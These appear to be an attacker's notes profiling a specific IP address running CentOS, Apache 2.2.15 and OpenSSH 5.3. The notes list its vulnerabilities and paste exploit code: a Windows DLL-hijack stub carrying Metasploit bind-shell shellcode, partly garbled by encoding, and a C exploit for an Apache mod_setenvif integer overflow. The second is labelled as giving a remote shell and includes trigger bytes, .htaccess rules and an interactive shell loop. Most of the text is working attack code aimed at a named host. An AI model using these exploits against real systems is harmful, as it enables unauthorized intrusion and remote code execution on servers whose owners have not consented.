sic info
IP: 140.211.89.15
OS:
 - CentOS
Other:

 - Apache version 2.2.15
 - OpenSSH 5.3

Vulnerabilities found:

Apache 2.2.15
 - Integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif (If its in 2.2.19, it is in 2.2.15)
 - DOS (many remote denial of services)
 - DLL hijacking vulnerability (First exploit code) (Windows only.) :( 


-----------------------------------------

Exploit code:

(NOT TESTED)

File Vulnerable:
- httpd.exe
- ApacheMonitor.exe
- htpasswd.exe
- htdigest.exe
- htdbm.exe
- htcacheclean.exe
- httxt2dbm.exe
- openssl.exe
- rotatelogs.exe
- wintty.exe
*/
#include &lt;windows.h&gt;
#define DllExport __declspec (dllexport)
/*
* windows/shell_bind_tcp – 476 bytes
* http://www.metasploit.com
* Encoder: x86/shikata_ga_nai
* LPORT=1313, RHOST=, EXITFUNC=process, InitialAutoRunScript=,
* AutoRunScript=
*/
unsigned char buf[] =
&quot;x33xc9xb1×71xd9xccxd9×74x24xf4×5axb8×8bxf0×6b&quot;
&quot;x88×31x42×14x03×42x14×83xeax77×12x9ex51×4bx0a&quot;
&quot;x15×46xa7×13x2exc4×17x2dx90xfax5ex1cx44xccx17&quot;
&quot;x46×1axc1×2bx7bx6bx0bxc9xcbx79xf3×02x70xa7×1c&quot;
&quot;x1ax18×5exeax0ex4cx26×6dx61×78x82×18x2ex5cxb0&quot;
&quot;x47×78xb2xc4×13xa2×2bxfax10xe4×75x67xb5×3cx0f&quot;
&quot;xd8xbcxefxaexddxf7×7cx02×82xd9×94x69xf6×52x08&quot;
&quot;xc3xddx4dx9fx38×1fx4cx58×59x99×20xcex33×2bxe6&quot;
&quot;x9ex58×2ax15×3axe7xacx30×0fxd9×19xf0xbcx96xe1&quot;
&quot;xc5xdcxfcxe7×42x6ex35×16x4axf8×16x82×92x75xcd&quot;
&quot;x72xb0×29x9exe4xadxa0×37x18×21xf9×5ax28xcaxc7&quot;
&quot;x9exa3×1dxd5xe7xbexcexb6×58x9ax29xdcx1axbax13&quot;
&quot;x72×13x09×87x4cx1cxf4×9ax33×30x57×38x59×4fx63&quot;
&quot;x4ax8fxdfx2bxc7×3bx4ax2dx22×97x08×8dxf0×36x57&quot;
&quot;x04×14x71×65x45×49xf3×0cx20xaex9dxefxc1xecxe7&quot;
&quot;xcbx29×4fx12×65x23×10xb5xbcx8dxa0xafxc8×72x85&quot;
&quot;x6cx72×2exe8×22x8fx3bx16×40x86×68x80×7dxafxf4&quot;
&quot;xd1xcdxf6×7exd5×29x45xdbx05×92x29xc8xe2xb4×13&quot;
&quot;xfbxebx3bx9ex9cxfex62xacx9dxa1×5cx9bx40×3fx12&quot;
&quot;xc6×92xf6×5cx16xdbx64×62xcdx20×58x5fx69×71x80&quot;
&quot;x11xa4xdex36xf3×73x53×86x07xbax93×68x03×99xaf&quot;
&quot;xf7xd5×91x1fxcbxc3×0ex66×94xdcx5ax69×57xe3×76&quot;
&quot;x21×98x42×03x51×0ex59×36x6fx8dxcax74xfax6ex45&quot;
&quot;x1dx97×67x4bx6fxc2xa6xebxe2×6dxc0×1axe7xaex0b&quot;
&quot;x40xc5xbex68×96xbbx8exe3×0fx6exb4×4ex25×14xe0&quot;
&quot;xd0xa4×5ex63xeaxb6xecx72×47xbbxf2×2dx24xcexa1&quot;
&quot;x5dx4fx3bx15xf7×43x09×8dx49×29xa6×4exf2×38xcc&quot;
&quot;x9cx3fx40×37x0dx9dxe6×85x77xb4×01xf8×66x3fx0a&quot;
&quot;x04×88x79×50xebx51xa7xf6×13x98×88xe5×92x8bx5d&quot;
&quot;xc4×69x69xdbx3ax19×03xf8xf5xdex75×17x75×1dxd3&quot;
&quot;x80×55xd3×72xcbxd5×04x7cx2dxbdxddx09xeex44×57&quot;
&quot;x5ax72×31xacxfbx9bxf9×5fx59xb0xfd&quot;;
BOOL WINAPI DllMain (
HANDLE hinstDLL,
DWORD fdwReason,
LPVOID lpvReserved)
{
int (*func)();
func = (int (*)()) buf;
(int)(*func)();
return 0;
}


--------------------------------------------------------------
Integer overflow
THIS CODE SHOULD GIVE A REMOTE SHELL:

- include <errno.h>
- include <fcntl.h>
- include <netinet/in.h>
- include <stdio.h>
- include <stdlib.h>
- include <string.h>
- include <sys/socket.h>
- include <sys/types.h>
- include <unistd.h>
 
int sendFull(int socketFd, char *data, int length) {
  int   result;
 
  while(length) {
    result=write(socketFd, data, length);
    if(result<=0) {
      if(errno==EAGAIN) continue;
      fprintf(stderr, "Write failed, result %d, error %d(%s)\n",
          result, errno, (char*)strerror(errno));
      return(-1);
    }
    data+=result;
    length-=result;
  }
  return(0);
}
 
int main(int argc, char **argv) {
  int   argPos;
 
  char  *requestData;
  int   requestLength=0;
  int   triggerOffset;
 
/** Payload locations containing libc addresses. Used to generate
 *  payloads for different offsets. For testing, read offset from
 * /proc/<pid>/maps
 */
  int   triggerLibcPointers[]={
      0x4,  // __libc_dlopen_mode
      0x29, // _IO_file_seekoff+407
      -1
  };
 
/*
SetEnvIf Trigger "^(.{2}).*$" T1=$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
SetEnvIf T1 "^(.{256})(.{256})(.*)$" T2=$1&$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$3$2
SetEnvIf T2 "^(.{270})(.{242})(.{65280}.{65280}.{7700})(.{236})(.*)$" T33=$3$1&$2$4&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&$5
SetEnvIf T2 "^.{1028}(.{3}).*" T4=XXXX$1
SetEnvIf T2 ".*" T5=/var/www/libTestLib.so
 
*/
 
 
  char  triggerData[]= {
// Stop: 2439, Test: 5c5c   address __libc_dlopen_mode
    0x24, 0x39, 0xe0, 0xc1, 0x90, 0xad, 0x10, 0xc1, // 0x0 == off 0x18
    0x21, 0x40, 0xe0, 0xc1, 0x25, 0x40, 0xe0, 0xc1, // 0x08 == off 0x20
    0x28, 0x40, 0xe0, 0xc1, 0x2c, 0x40, 0xe0, 0xc1, // 0x10 == off 0x28
    0x30, 0x40, 0xe0, 0xc1, 0x34, 0x40, 0xe0, 0xc1, // 0x18 == off 0x30
// incremented, must not be
// 0xff, otherwise endless
    0x38, 0x40, 0xe0, 0xc1, 0x3c, 0x40, 0xe0, 0xc1, // 0x20 == off 0x..
// first fn-call target addr
// use _IO_file_seekoff+407
    0x40, 0xf7, 0xef, 0x10, 0x44, 0x40, 0xe0, 0xc1, // 0x.. == off 0x40
    0x48, 0x40, 0xe0, 0xc1, 0x4c, 0x40, 0xe0, 0xc1, // 0x.. == off 0x48
// pool ptr
    0x48, 0x40, 0x40, 0xa9, 0x54, 0x40, 0xe0, 0xc1, // 0x.. == off 0x50
    0x58, 0x40, 0xe0, 0xc1, 0x5c, 0x40, 0xe0, 0xc1, // 0x.. == off 0x58
    0x60, 0x40, 0xe0, 0xc1, 0x64, 0x40, 0xe0, 0xc1, // 0x.. == off 0x60
//                                point to 2nd jmp address -0x40
    0x68, 0x40, 0xe0, 0xc1, 0x6c, 0xdd, 0x40, 0x40, // 0x.. == off 0x68
//                          pool->active
    0xa9, 0x40, 0xe0, 0xc1, 0xc0, 0x40, 0x40, 0xa9, // 0x.. == off 0x70
    0x78, 0x40, 0xe0, 0xc1, 0x7c, 0x40, 0xe0, 0xc1, // 0x.. == off 0x78
    0x80, 0x40, 0xe0, 0xc1, 0x84, 0x40, 0xe0, 0xc1, // 0x.. == off 0x80
    0x88, 0x40, 0xe0, 0xc1, 0x8c, 0x40, 0xe0, 0xc1, // 0x.. == off 0x88
    0x90, 0x40, 0xe0, 0xc1, 0x94, 0x40, 0xe0, 0xc1, // 0x.. == off 0x90
    0x98, 0x40, 0xe0, 0xc1, 0x9c, 0x40, 0xe0, 0xc1, // 0x80 == off 0x98
    0xa0, 0x40, 0xe0, 0xc1, 0xa4, 0x40, 0xe0, 0xc1, // 0x.. == off 0xa0
    0xa8, 0x40, 0xe0, 0xc1, 0xac, 0x40, 0xe0, 0xc1, // 0x.. == off 0x..
    0xb0, 0x40, 0xe0, 0xc1, 0xb4, 0x40, 0xe0, 0xc1, // 0x.. == off 0xb0
    0xb8, 0x40, 0xe0, 0xc1, 0xbc, 0x40, 0xe0, 0xc1, // 0x.. == off 0x..
    0xc0, 0x40, 0xe0, 0xc1, 0xc4, 0x40, 0xe0, 0xc1, // 0x.. == off 0xc0
    0xc8, 0x40, 0xe0, 0xc1, 0xcc, 0x40, 0xe0, 0xc1, // 0x.. == off 0xc8
//  first                   end (0x14)
    0x19, 0x41, 0x40, 0xa9, 0x04, 0x51, 0x40, 0xc1, // 0x.. == off 0xd0
//  active                  pool
    0xc0, 0x40, 0x40, 0xc1, 0x21, 0x41, 0x40, 0xa9, // 0x.. == off 0xd8
//  elt_size                nelts
    0xfc, 0xff, 0xff, 0xff, 0xff, 0xfe, 0xff, 0xff, // 0x.. == off 0xe0
//  nalloc                  elts
    0x01, 0xff, 0xff, 0xff, 0x08, 0x41, 0x40, 0xa9, // 0x.. == off 0xe8
// 0-apr_table_setn 0x58b: key
//  index_initialized
    0x1a, 0x40, 0x40, 0xa9, 0xf4, 0x40, 0xe0, 0xc1, // 0x.. == off 0xf0
//                          1-apr_table_setn 613:
    0xf8, 0x40, 0xe0, 0xc1, 0xdc, 0x40, 0x40, 0xa9, // 0x.. == off 0xf8
    0x10, 0x40, 0xe0, 0xc1, 0xf4, 0x40, 0xe0, 0xc1, // 0xe8 == off 0x00
    0x08, 0x40, 0xe0, 0xc1, 0x0c, 0x40, 0xe0, 0xc1, // 0xf0 == off 0x08
    0x10, 0x40, 0xe0, 0xc1, 0x14, 0x40, 0xe0, 0xc1, // 0xf8 == off 0x10
  };
 
 
/*
x-memcpy:
.htaccess file buffer offset calibration when segfaulting:
print /x *(int)($esp+0x4c)-*(int)($esp+0x24)
 
0-apr_table_setn 0x58b: FIXME: MOVE CHECK
Read address of key, no writes to that location at the given location.
The lower 0x1f bits of key are used to construct the key hash,
used in hash-table offset calculation, so the lower 5 bits
should be simple to get a 0-index.
 
1-apr_table_setn 0x613: FIXME: MOVE CHECK
Read (t)->index_initialized in TABLE_INDEX_IS_INITIALIZED from
t+0x14. This value is compared to 1<<0x18 (0x1000000). Not clear,
if hash value depends on memlayout of apache server.
 
2-apr_table_setn 0x803: FIXME MOVE CHECK
Write key address from 0-apr_table_setn to address created
by table data multiplication. The target address is loaded
from $ebp-0x3c and was $eax return from call 0xab5878. Result
is from function apr_array_push_noclear (srclib/apr/tables/apr_tables.c).
The function uses table struct ptr from $ebp+0x8 (is 1-apr_table_setn
value).
 
If struct value at +0x8 (nelts) is same as +0xc (nalloc), then
apr_array_push_noclear will trigger new allocation.
 
Increment in struct adds 0-byte at +0x8, but not useable because size
value at +0x4.
 
3-apr_palloc: Call abortfunction
Allows jump to any address, but none of the other registers
contains user-controlled valued
 
4-_IO_file_seekoff:
Write a user-controlled pointer to (%esp) and $0x1 to (%esp+0x4)
 
   0x00736ff7 <_IO_file_seekoff+407>:   mov    0x8(%ebp),%ecx
   0x00736ffa <_IO_file_seekoff+410>:   mov    0x14(%ebp),%edx
   0x00736ffd <_IO_file_seekoff+413>:   mov    0x4c(%ecx),%eax
   0x00737000 <_IO_file_seekoff+416>:   mov    %esi,0x4(%esp)
   0x00737004 <_IO_file_seekoff+420>:   mov    %edx,0xc(%esp)
   0x00737008 <_IO_file_seekoff+424>:   mov    %edi,0x8(%esp)
   0x0073700c <_IO_file_seekoff+428>:   mov    %ecx,(%esp)
   0x0073700f <_IO_file_seekoff+431>:   call   *0x40(%eax)
 
5-__libc_dlopen_mode:
Load the library placed within the directory, where also .htaccess is
 
*/
 
  int   libcMapPos=0x14f000;
  int   heapTargetPos=0xabe04000;
  struct sockaddr_in    address;
  int   socketFd=-1;
  int   result;
  char  buffer[1<<12];
  char* endArgs[2];
 
  for(argPos=1; argPos<argc; argPos++) {
    if(!strcmp(argv[argPos], "--LibcMapPos")) {
      libcMapPos=strtoul(argv[++argPos], NULL, 0);
      continue;
    }
 
    fprintf(stderr, "Unkown argument %s\n", argv[argPos]);
    return(1);
  }
  fprintf(stderr, "Using libc map pos at 0x%x\n", libcMapPos);
 
// Set libcMapPos in trigger payload
  for(result=0; triggerLibcPointers[result]>=0; result++) {
    *((int*)(triggerData+triggerLibcPointers[result]))+=libcMapPos;
  }
 
  fprintf(stderr, "Opening ...\n");
  socketFd=socket(AF_INET, SOCK_STREAM, 0);
  if(socketFd<0) {
    fprintf(stderr, "Socket open failed, error %s\n",
        (char*)strerror(errno));
    exit(1);
  }
 
  address.sin_family=AF_INET;
  address.sin_port=htons(80);
  address.sin_addr.s_addr=htonl(0x7f000001);
  result=connect(socketFd, (struct sockaddr*)(&address),
      sizeof(struct sockaddr_in));
  if(result) {
    fprintf(stderr, "Connect failed, error %s\n", (char*)strerror(errno));
    close(socketFd); 
    socketFd=-1;
    exit(1);
  }
 
// x/1024s 0xa9eb0000
//        0xa9ebb81c
// in:    0xa9ebd81c
// start: 0xa9e8d018
//  memset(triggerData+2, 0x41, 254);
 
  requestData=(char*)malloc(1<<16);
  memset(requestData, 0, 1<<16);
  requestLength+=sprintf(requestData, "GET /x.txt HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-Alive\r\n\r\n");
  result=sendFull(socketFd, requestData, requestLength);
  usleep(30000);
 
  requestLength=0;
  requestLength+=sprintf(requestData, "GET /x.txt HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-Alive\r\n");
 
  requestLength+=sprintf(requestData+requestLength, "Trigger: ");
  triggerOffset=requestLength;
  memcpy(requestData+requestLength, triggerData, 256);
  requestLength+=256;
  requestLength+=sprintf(requestData+requestLength, "\r\n");
 
  requestLength+=sprintf(requestData+requestLength, "\r\n");
 
  result=sendFull(socketFd, requestData, requestLength);
 
  if(result) {
    fprintf(stderr, "Write failed, len %d\n", result);
  } else {
    sendFull(socketFd, "echo; uname -a; echo;\n", 40);
// Select would be better ...
    result=fork();
    if(result) {
      while((result=read(0, buffer, sizeof(buffer)))>0) {
        if(result>0) write(socketFd, buffer, result);
      }
    } else {
      while((result=read(socketFd, buffer, sizeof(buffer)))>0) {
        if(result>0) write(1, buffer, result);
      }
    }
  }
 
  fprintf(stderr, "Completed\n");
}



